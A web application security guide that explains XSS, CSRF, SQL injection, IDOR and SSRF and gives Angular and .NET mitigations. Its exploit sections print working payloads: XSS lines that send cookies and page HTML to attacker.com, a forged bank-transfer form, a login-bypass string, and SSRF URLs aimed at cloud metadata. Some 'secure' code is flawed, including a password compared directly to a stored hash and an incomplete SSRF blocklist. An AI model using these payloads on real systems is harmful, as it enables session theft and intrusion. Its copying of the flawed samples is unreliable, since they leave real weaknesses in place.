# Web Application Security Guide: Core Vulnerabilities, First Principles, and Mitigations

This comprehensive guide breaks down the most critical web application security vulnerabilities from first principles. It provides concrete, real-world exploit examples and details exact mitigation strategies for both an **Angular frontend** and a **.NET backend**.

---

## 1. Cross-Site Scripting (XSS)

### 🧩 First Principles
A web browser treats any script inside an HTML document as executable code running within the website's security context. Browsers cannot distinguish between a script written by the original developer and a script injected by an attacker. XSS occurs when untrusted user input is treated as executable code by the browser instead of safe data.

### 💥 Practical Scenarios & Code Examples

#### Reflected XSS
* **Scenario:** A search page displays the user's query back to them: `"Results for: `<query>`"`.
* **Exploit Vector:** An attacker sends a victim a link containing a script payload in the query parameter.
* **Payload:** 
  ```text
  https://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
  ```

#### Stored XSS
* **Scenario:** A forum comment box saves user text directly into a database and renders it to subsequent visitors.
* **Payload:**
  ```html
  <p>Great post!</p><img src="x" onerror="fetch('https://attacker.com/clone?html='+btoa(document.body.innerHTML))">
  ```

#### DOM-Based XSS
* **Scenario:** Client-side JavaScript reads a hash fragment from the URL and writes it directly to the document object model (DOM) via an unsafe property.
* **Payload:**
  ```text
  https://example.com/dashboard#<iframe src="javascript:alert(1)"></iframe>
  ```

### 🛡️ Mitigation Steps

#### Frontend (Angular)
Angular treats all values as untrusted by default. When values are inserted into the DOM via interpolation or property bindings, Angular automatically contextualizes and encodes them.
* **Do Not Bypass Protection:** Never use `DomSanitizer` methods like `bypassSecurityTrustHtml` or `bypassSecurityTrustScript` with raw user input.
* **Safe Implementation Example:**
  ```typescript
  // Component code
  import { Component } from '@angular/core';

  @Component({
    selector: 'app-search',
    template: `<div [innerHTML]="safeText"></div>` // Bound securely by Angular
  })
  export class SearchComponent {
    // Angular will automatically encode HTML tags if passed into template text expressions
    // Use an established client-side sanitizer library like DOMPurify if raw HTML layout must be supported
    safeText: string = 'User input data goes here'; 
  }
  ```

#### Backend (.NET)
* **HTML Encoding Output:** If you are building server-side views (Razor Pages / Blazor), .NET automatically HTML-encodes all outputs generated via `@Variable` syntax.
* **Content Security Policy (CSP):** Configure a strong CSP header in your middleware to prevent the execution of inline scripts and unauthorized cross-domain assets.
  ```csharp
  // Program.cs middleware integration
  app.Use(async (context, next) =>
  {
      context.Response.Headers.Add("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none';");
      await next();
  });
  ```
* **Cookie Protection:** Mark session cookies as `HttpOnly` so client-side JavaScript cannot read them.
  ```csharp
  options.Cookie.HttpOnly = true;
  options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
  ```

---

## 2. Cross-Site Request Forgery (CSRF)

### 🧩 First Principles
Browsers naturally include session cookies automatically whenever a web request is made to a destination domain, regardless of which website originated that request. CSRF exploits this ambient authorization trait by tricking a victim's active browser session into submitting a state-changing transaction request to a trusted application without the victim's knowledge.

### 💥 Practical Scenarios & Code Examples
* **Scenario:** A logged-in user visits a malicious forum (`evil-site.com`). 
* **Exploit Vector:** The malicious site contains a hidden form that auto-submits via JavaScript to the victim's bank website.
* **Payload:**
  ```html
  <form id="csrfForm" action="https://yourbank.com/api/account/transfer" method="POST">
      <input type="hidden" name="amount" value="5000" />
      <input type="hidden" name="toAccount" value="99999" />
  </form>
  <script>
      document.getElementById('csrfForm').submit();
  </script>
  ```
* **Result:** The browser transmits the form along with the victim’s valid session cookie for `yourbank.com`. The bank processes the transfer request as valid.

### 🛡️ Mitigation Steps

#### Frontend (Angular)
Angular includes a built-in mechanism to handle Anti-CSRF tokens automatically.
* **HttpClient Integration:** Angular's `HttpClientModule` reads a token cookie (default name: `XSRF-TOKEN`) and appends it as an HTTP header (default name: `X-XSRF-TOKEN`) on all mutating requests (POST, PUT, DELETE).
  ```typescript
  // app.config.ts or AppModule
  import { provideHttpClient, withXsrfConfiguration } from '@angular/common/http';

  export const appConfig = {
    providers: [
      provideHttpClient(
        withXsrfConfiguration({
          cookieName: 'XSRF-TOKEN',
          headerName: 'X-XSRF-TOKEN',
        })
      )
    ]
  };
  ```

#### Backend (.NET)
The backend must issue the unique cryptographic token to the client cookie and strictly validate it against incoming headers on state-changing API endpoints.
* **Configure Antiforgery Middleware:**
  ```csharp
  // Program.cs
  builder.Services.AddAntiforgery(options => 
  {
      options.HeaderName = "X-XSRF-TOKEN"; // Matches Angular default
  });

  var app = builder.Build();

  // Middleware to send the token in a cookie on initial GET request
  app.Use(async (context, next) =>
  {
      var antiforgery = context.RequestServices.GetRequiredService<IAntiforgery>();
      var tokens = antiforgery.GetAndStoreTokens(context);
      context.Response.Cookies.Append("XSRF-TOKEN", tokens.RequestToken!, 
          new CookieOptions { HttpOnly = false, Secure = true, SameSite = SameSiteMode.Lax });
      
      await next();
  });
  ```
* **Enforce Validation on Controllers:**
  ```csharp
  [ApiController]
  [Route("api/[controller]")]
  [AutoValidateAntiforgeryToken] // Automatically validates POST/PUT/DELETE requests
  public class AccountController : ControllerBase
  {
      [HttpPost("transfer")]
      public IActionResult Transfer([FromBody] TransferModel model)
      {
          // Request processed safely
          return Ok();
      }
  }
  ```
* **SameSite Cookie Configuration:** Set the `SameSite=Lax` or `SameSite=Strict` flag on all application authentication cookies to block browsers from transmitting them during cross-site navigations.

---

## 3. SQL Injection (SQLi)

### 🧩 First Principles
Databases process strings of text as commands. SQL Injection occurs when an application takes user input and concatenates it directly into a static SQL database query string. Because the query parser cannot isolate the structural intent of the query from the embedded string data, the database interprets the user input as engine execution directives.

### 💥 Practical Scenarios & Code Examples
* **Scenario:** A login authentication endpoint checks a username and password.
* **Vulnerable Backend Logic:**
  ```csharp
  string query = "SELECT * FROM Users WHERE User = '" + txtUser.Text + "' AND Pass = '" + txtPass.Text + "'";
  ```
* **Payload:** The attacker inputs `' OR '1'='1` inside the username field.
* **Resulting Query evaluated by DB:**
  ```sql
  SELECT * FROM Users WHERE User = '' OR '1'='1' AND Pass = ''
  ```
* **Result:** Since `'1'='1'` is always true, the database bypasses the password condition entirely and returns the first row of the table, logging the attacker in as the administrator.

### 🛡️ Mitigation Steps

#### Frontend (Angular)
Frontend input validation cannot prevent SQL Injection because attackers can bypass the frontend interface and interact directly with raw API endpoints. The frontend's role is to ensure validation matches expected inputs for user experience rather than infrastructural security boundaries.

#### Backend (.NET)
* **Use Parameterized Queries / ORMs:** Do not build SQL syntax dynamically using concatenation or interpolation. Use an Object-Relational Mapper (ORM) like **Entity Framework Core**, which implicitly implements parameterized commands under the hood.
  ```csharp
  // SECURE implementation using Entity Framework Core (LINQ)
  public async Task<User?> AuthenticateUserAsync(string username, string password)
  {
      return await _context.Users
          // EF Core translates this using safe db command parameterization
          .FirstOrDefaultAsync(u => u.Username == username && u.PasswordHash == password);
  }
  ```
* **Raw SQL Fallback Safetynet:** If you must use raw SQL strings via Dapper or ADO.NET, enforce strong explicit parameters:
  ```csharp
  // SECURE execution using ADO.NET Parameters
  using (SqlCommand command = new SqlCommand("SELECT * FROM Users WHERE User = @user", connection))
  {
      command.Parameters.Add("@user", SqlDbType.VarChar, 50).Value = username;
      // Database engine safely isolates this value from execution flow
      var reader = await command.ExecuteReaderAsync();
  }
  ```

---

## 4. Broken Object Level Authorization (BOLA / IDOR)

### 🧩 First Principles
Web applications often track unique internal data rows using sequential numbers or predictable identifiers (like integer primary keys or UUIDs) exposed directly in APIs. BOLA/IDOR occurs when a system relies entirely on client-provided object identifiers to fetch data without verifying if the authenticated user session possesses access rights to that specific entity instance.

### 💥 Practical Scenarios & Code Examples
* **Scenario:** An application allows users to pull up their monthly invoice details via an API endpoint.
* **Exploit Vector:** An authenticated user notices their profile uses the following routing scheme: `https://example.com/api/invoices/10045`.
* **Payload:** The user updates the address bar or modifies the fetch parameter manually to target sequentially close resources: `https://example.com/api/invoices/10046`.
* **Result:** If the backend script checks that the requester is a *logged-in user* but fails to check *which specific user owns invoice 10046*, it serves private account data to an unauthorized third party.

### 🛡️ Mitigation Steps

#### Frontend (Angular)
Frontend route guards (`CanActivate`) restrict access to UI views but cannot enforce data security at the database layer. Always design the frontend to dynamically display views based on the server-authenticated session response context, and avoid caching cross-user data identifiers globally.

#### Backend (.NET)
Every business logic layer or controller endpoint must cross-reference the user’s primary identifier (extracted securely from their access token or session claim) against the target database asset's ownership key.

```csharp
[Authorize]
[HttpGet("api/invoices/{invoiceId}")]
public async Task<IActionResult> GetInvoice(int invoiceId)
{
    // 1. Securely fetch the current User ID from claims principal token context
    var currentUserId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    
    if (string.IsNullOrEmpty(currentUserId))
        return Unauthorized();

    // 2. Fetch the target data entity from database
    var invoice = await _context.Invoices.FindAsync(invoiceId);
    
    if (invoice == null)
        return NotFound(); // Return NotFound rather than Forbidden to obscure existence

    // 3. SECURE STEP: Validate the data ownership mapping explicitly
    if (invoice.OwnerUserId != currentUserId)
    {
        // Fail the request if the resource does not belong to the active user session
        return NotFound(); 
    }

    return Ok(invoice);
}
```

---

## 5. Server-Side Request Forgery (SSRF)

### 🧩 First Principles
Backends often occupy trusted inner networks protected by external firewall perimeters. When a web application accepts a remote network address from a client and commands the backend server to make an outbound HTTP connection request to that URL, it acts as a proxy proxy proxy. SSRF occurs when an attacker manipulates that parameter to make the hosting server send requests to unintended internal systems or private cloud infrastructure metadata interfaces.

### 💥 Practical Scenarios & Code Examples
* **Scenario:** A profile page lets a user specify a remote image URL link (`https://assets.site.com/avatar.png`) to parse and cache a profile avatar.
* **Exploit Vector:** The attacker provides a URL targeting the hosting environment's loopback interface or cloud metadata engine endpoint.
* **Payload 1 (Internal Network Scan):** `http://127.0.0.1:8080/admin/delete-database`
* **Payload 2 (Cloud Provider Metadata Exfiltration):** `http://169.254.169.254/latest/meta-data/`
* **Result:** The backend fetches the URL from its internal location context. Since the server runs inside the secure perimeter, the cloud instance metadata provider responds to it without authorization checks, giving the attacker access to temporary security credentials, environment tokens, or database command shells.

### 🛡️ Mitigation Steps

#### Frontend (Angular)
Sanitize user-provided text inputs using URL parsing patterns to catch malformed structures early. Ensure you alert users if input formatting doesn't resemble a standard public web address schema.

#### Backend (.NET)
* **Strict Whitelisting:** If your application must pull down remote assets, validate the target address against a hard whitelist of explicitly trusted domain strings.
* **Disable Input URLs Whenever Possible:** Allow users to choose from predefined keys or use secure upload interfaces instead of specifying raw execution endpoints.
* **Implement Network Level Restrictions:** Configure isolated routing rules so that your web application host environment cannot communicate with the local instance loopback interface (`127.0.0.1`) or the standard cloud metadata block (`169.254.169.254`).

```csharp
public async Task<IActionResult> FetchProfilePreview(string userProvidedUrl)
{
    // Validate URI structure syntax parsing
    if (!Uri.TryCreate(userProvidedUrl, UriKind.Absolute, out var validatedUri))
    {
        return BadRequest("Invalid URL layout format.");
    }

    // Explicitly restrict requests to external public targets only
    var targetHost = validatedUri.Host.ToLower();
    
    // Explicitly block local or private IP patterns
    if (targetHost == "localhost" || targetHost == "127.0.0.1" || targetHost.StartsWith("192.168."))
    {
        return BadRequest("Unauthorized network location targeted.");
    }

    // Recommended approach: Ensure domain explicitly matches a whitelisted host collection
    var allowedDomains = new List<string> { "images.unsplash.com", "res.cloudinary.com" };
    if (!allowedDomains.Contains(targetHost))
    {
        return BadRequest("Target domain location is not whitelisted.");
    }

    using var httpClient = new HttpClient();
    var responseData = await httpClient.GetAsync(validatedUri);
    // Process response stream safely...
    return Ok();
}
```
